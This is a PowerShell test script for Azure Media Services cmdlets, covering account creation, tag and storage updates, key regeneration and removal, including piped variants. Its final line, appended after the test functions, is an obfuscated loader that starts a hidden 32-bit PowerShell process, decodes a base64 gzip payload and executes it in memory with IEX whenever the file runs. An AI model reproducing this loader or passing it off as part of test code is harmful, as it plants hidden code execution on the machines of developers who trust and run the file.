














function Test-Media
{
  $rgname = GetResourceGroupName
  $preferedlocation = "East US"
  $location = Get-AvailableLocation $preferedlocation
  Write-Output $location

  $resourceGroup = CreateResourceGroup $rgname $location

  $storageAccountName1 = "sto" + $rgname
  $storageAccount1 = CreateStorageAccount $rgname $storageAccountName1 $location

  $storageAccountName2 = "sto" + $rgname + "2"
  $storageAccount2 = CreateStorageAccount $rgname $storageAccountName2 $location

  
  $accountName = "med" + $rgname
  $availability = Get-AzMediaServiceNameAvailability -AccountName $accountName
  Assert-AreEqual $true $availability.nameAvailable

  
  $accountName = "med" + $rgname
  $tags = @{"tag1" = "value1"; "tag2" = "value2"}
  $storageAccount1 = GetStorageAccount -ResourceGroupName $rgname -Name $storageAccountName1
  $mediaService = New-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Location $location -StorageAccountId $storageAccount1.Id -Tag $tags
  Assert-NotNull $mediaService
  Assert-AreEqual $accountName $mediaService.AccountName
  Assert-AreEqual $rgname $mediaService.ResourceGroupName
  Assert-AreEqual $location $mediaService.Location
  Assert-Tags $tags $mediaService.Tags
  Assert-AreEqual $storageAccountName1 $mediaService.StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $rgname $mediaService.StorageAccounts[0].ResourceGroupName

  $availability = Get-AzMediaServiceNameAvailability -AccountName $accountName
  Assert-AreEqual $false $availability.nameAvailable

  
  $mediaServices = Get-AzMediaService -ResourceGroupName $rgname
  Assert-NotNull $mediaServices
  Assert-AreEqual 1 $mediaServices.Count
  Assert-AreEqual $accountName $mediaServices[0].AccountName
  Assert-AreEqual $rgname $mediaServices[0].ResourceGroupName
  Assert-AreEqual $location $mediaServices[0].Location
  Assert-AreEqual $storageAccountName1 $mediaServices[0].StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $rgname $mediaServices[0].StorageAccounts[0].ResourceGroupName

  
  $mediaService = Get-AzMediaService -ResourceGroupName $rgname -AccountName $accountName
  Assert-NotNull $mediaService
  Assert-AreEqual $accountName $mediaService.AccountName
  Assert-AreEqual $rgname $mediaService.ResourceGroupName
  Assert-AreEqual $location $mediaService.Location
  Assert-AreEqual $storageAccountName1 $mediaService.StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $rgname $mediaService.StorageAccounts[0].ResourceGroupName

  
  $tagsUpdated = @{"tag3" = "value3"; "tag4" = "value4"}
  $storageAccount2 = GetStorageAccount -ResourceGroupName $rgname -Name $storageAccountName2
  $primaryStorageAccount = New-AzMediaServiceStorageConfig -storageAccountId $storageAccount1.Id -IsPrimary
  $secondaryStorageAccount = New-AzMediaServiceStorageConfig -storageAccountId $storageAccount2.Id
  $storageAccounts = @($primaryStorageAccount, $secondaryStorageAccount)
  $mediaServiceUpdated = Set-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Tag $tagsUpdated -StorageAccounts $storageAccounts
  Assert-NotNull $mediaServiceUpdated
  Assert-Tags $tagsUpdated $mediaServiceUpdated.Tags
  Assert-AreEqual $storageAccountName1 $mediaServiceUpdated.StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $storageAccountName2 $mediaServiceUpdated.StorageAccounts[1].AccountName
  Assert-AreEqual $false $mediaServiceUpdated.StorageAccounts[1].IsPrimary

  
  $serviceKeys = Get-AzMediaServiceKeys -ResourceGroupName $rgname -AccountName $accountName
  Assert-NotNull $serviceKeys
  Assert-NotNull $serviceKeys.PrimaryAuthEndpoint
  Assert-NotNull $serviceKeys.PrimaryKey
  Assert-NotNull $serviceKeys.SecondaryAuthEndpoint
  Assert-NotNull $serviceKeys.SecondaryKey
  Assert-NotNull $serviceKeys.Scope

  
  $serviceKeysUpdated1 = Set-AzMediaServiceKey -ResourceGroupName $rgname -AccountName $accountName -KeyType Primary
  Assert-NotNull $serviceKeysUpdated1
  Assert-NotNull $serviceKeysUpdated1.Key
  Assert-AreNotEqual $serviceKeys.PrimaryKey $serviceKeysUpdated1.Key

  $serviceKeysUpdated2 = Set-AzMediaServiceKey -ResourceGroupName $rgname -AccountName $accountName -KeyType Secondary
  Assert-NotNull $serviceKeysUpdated2
  Assert-NotNull $serviceKeysUpdated2.Key
  Assert-AreNotEqual $serviceKeys.SecondaryKey $serviceKeysUpdated2.Key

  
  Remove-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Force
  $mediaServices = Get-AzMediaService -ResourceGroupName $rgname
  Assert-Null $mediaServices

  
  $tags = @{"tag1" = "value1"; "tag2" = "value2"}
  $mediaService = New-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Location $location -StorageAccounts $storageAccounts -Tag $tags
  Assert-NotNull $mediaService
  Assert-AreEqual $accountName $mediaService.AccountName
  Assert-AreEqual $rgname $mediaService.ResourceGroupName
  Assert-AreEqual $location $mediaService.Location
  Assert-Tags $tags $mediaService.Tags
  Assert-AreEqual $storageAccountName1 $mediaService.StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $rgname $mediaService.StorageAccounts[0].ResourceGroupName
  Assert-AreEqual $storageAccountName2 $mediaService.StorageAccounts[1].AccountName
  Assert-AreEqual $false $mediaService.StorageAccounts[1].IsPrimary
  Assert-AreEqual $rgname $mediaService.StorageAccounts[1].ResourceGroupName

  Remove-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Force
  RemoveStorageAccount $rgname $storageAccountName1
  RemoveStorageAccount $rgname $storageAccountName2
  RemoveResourceGroup $rgname
}


function Test-MediaWithPiping
{
  $rgname = GetResourceGroupName
  $preferedlocation = "East US"
  $location = Get-AvailableLocation $preferedlocation

  $resourceGroup = CreateResourceGroup $rgname $location
  Assert-NotNull $resourceGroup
  Assert-AreEqual $rgname $resourceGroup.ResourceGroupName
  Assert-AreEqual $location $resourceGroup.Location

  $storageAccountName1 = "sto" + $rgname
  $storageAccount1 = CreateStorageAccount $rgname $storageAccountName1 $location

  
  $accountName = "med" + $rgname
  $tags = @{"tag1" = "value1"; "tag2" = "value2"}
  $mediaService = GetStorageAccount -ResourceGroupName $rgname -Name $storageAccountName1 | New-AzMediaService -ResourceGroupName $rgname -AccountName $accountName -Location $location -Tag $tags
  Assert-NotNull $mediaService
  Assert-AreEqual $accountName $mediaService.AccountName
  Assert-AreEqual $rgname $mediaService.ResourceGroupName
  Assert-AreEqual $location $mediaService.Location
  Assert-Tags $tags $mediaService.Tags
  Assert-AreEqual $storageAccountName1 $mediaService.StorageAccounts[0].AccountName
  Assert-AreEqual $true $mediaService.StorageAccounts[0].IsPrimary
  Assert-AreEqual $rgname $mediaService.StorageAccounts[0].ResourceGroupName

  
  $tagsUpdated = @{"tag3" = "value3"; "tag4" = "value4"}
  $mediaServiceUpdated = Get-AzMediaService -ResourceGroupName $rgname -AccountName $accountName | Set-AzMediaService -Tag $tagsUpdated
  Assert-NotNull $mediaServiceUpdated
  Assert-Tags $tagsUpdated $mediaServiceUpdated.Tags

  
  $serviceKeys = Get-AzMediaService -ResourceGroupName $rgname -AccountName $accountName | Get-AzMediaServiceKeys
  Assert-NotNull $serviceKeys
  Assert-NotNull $serviceKeys.PrimaryAuthEndpoint
  Assert-NotNull $serviceKeys.PrimaryKey
  Assert-NotNull $serviceKeys.SecondaryAuthEndpoint
  Assert-NotNull $serviceKeys.SecondaryKey
  Assert-NotNull $serviceKeys.Scope

  
  $serviceKeysUpdated2 = Get-AzMediaService -ResourceGroupName $rgname -AccountName $accountName | Set-AzMediaServiceKey -KeyType Secondary
  Assert-NotNull $serviceKeysUpdated2
  Assert-NotNull $serviceKeysUpdated2.Key
  Assert-AreNotEqual $serviceKeys.SecondaryKey $serviceKeysUpdated2.Key

  
  Get-AzMediaService -ResourceGroupName $rgname -AccountName $accountName | Remove-AzMediaService -Force

  RemoveStorageAccount $rgname $storageAccountName
  RemoveResourceGroup $rgname
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''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''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

